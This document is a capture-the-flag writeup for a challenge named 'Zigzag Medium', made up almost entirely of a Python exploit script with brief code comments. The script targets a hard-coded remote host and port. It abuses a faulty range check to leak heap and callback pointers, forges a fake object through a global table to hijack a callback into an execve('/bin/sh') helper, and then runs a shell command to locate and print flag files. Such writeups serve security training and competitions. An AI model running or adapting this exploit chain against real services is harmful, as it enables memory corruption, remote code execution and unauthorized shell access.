# Zigzag Medium Challenge Writeup
```python
#!/usr/bin/env python3
import socket
import struct
import sys
import time

HOST = "154.57.164.70"
PORT = 32629
CALLBACK_OFF = 0x14F30
WIN_OFF = 0x6B820
TABLE_OFF = 0x7C000


class Client:
    def __init__(self, sock):
        self.sock = sock
        self.buf = bytearray()

    def _recv(self):
        self.sock.settimeout(3.0)
        chunk = self.sock.recv(8192)
        if not chunk:
            raise RuntimeError("remote closed the connection")
        self.buf += chunk

    def until(self, marker):
        while marker not in self.buf:
            self._recv()
        end = self.buf.index(marker) + len(marker)
        out = bytes(self.buf[:end])
        del self.buf[:end]
        return out

    def ok(self):
        return self.until(b"OK\n")

    def value(self):
        marker = b"VALUE "
        while marker not in self.buf:
            self._recv()
        start = self.buf.index(marker)
        while b"\n" not in self.buf[start + len(marker):]:
            self._recv()
        end = self.buf.index(b"\n", start + len(marker)) + 1
        out = bytes(self.buf[start:end])
        del self.buf[:end]
        return out


def value_from(reply):
    return reply.split(b"VALUE ", 1)[1].split(b"\n", 1)[0]


def qword(value):
    return struct.pack("<Q", value)


def main():
    with socket.create_connection((HOST, PORT), timeout=5.0) as sock:
        client = Client(sock)
        # Same 32-byte allocator bucket as the 24-byte metadata object.
        sock.sendall(b"PUT 0 24\n" + b"A" * 24)
        client.ok()

        # The buggy range check permits reading into the neighboring object.
        sock.sendall(b"GET 0 48\n")
        data_ptr = struct.unpack_from("<Q", value_from(client.value()), 32)[0]

        # Keep the data pointer intact, but enlarge the stored render length.
        # RENDER then leaks the callback pointer at data_ptr + 48.
        leak_patch = bytearray(48)
        leak_patch[32:40] = qword(data_ptr)
        leak_patch[40:48] = qword(56)
        sock.sendall(b"PATCH 0 48\n" + leak_patch)
        client.ok()

        sock.sendall(b"RENDER 0\n")
        leaked = value_from(client.value())
        callback = struct.unpack_from("<Q", leaked, 48)[0]
        base = callback - CALLBACK_OFF
        table = base + TABLE_OFF
        win = base + WIN_OFF

        # Forge the object stored in our data slot and point the real object
        # at the global key table for the next PATCH.
        forge_patch = bytearray(48)
        forge_patch[0:8] = qword(data_ptr)
        forge_patch[8:16] = qword(0)
        forge_patch[16:24] = qword(win)
        forge_patch[32:40] = qword(table)
        forge_patch[40:48] = qword(48)
        sock.sendall(b"PATCH 0 48\n" + forge_patch)
        client.ok()

        # Replace table[0] with the controlled data slot, making it a fake
        # Note object whose callback is the binary's execve("/bin/sh") helper.
        table_patch = bytearray(48)
        table_patch[0:8] = qword(data_ptr)
        sock.sendall(b"PATCH 0 48\n" + table_patch)
        client.ok()

        sock.sendall(b"RENDER 0\n")
        time.sleep(0.5)

        # The callback has replaced the process with /bin/sh. Search only for
        # flag-like files on this challenge instance and print their contents.
        command = (
            b"find / -maxdepth 4 -type f -iname 'flag*' "
            b"-print -exec cat {} \\; 2>/dev/null; echo __DONE__\n"
        )
        sock.sendall(command)
        output = bytearray()
        sock.settimeout(3.0)
        while True:
            try:
                chunk = sock.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            output += chunk
            if b"__DONE__" in output:
                break
        sys.stdout.buffer.write(output)


if __name__ == "__main__":
    main()

```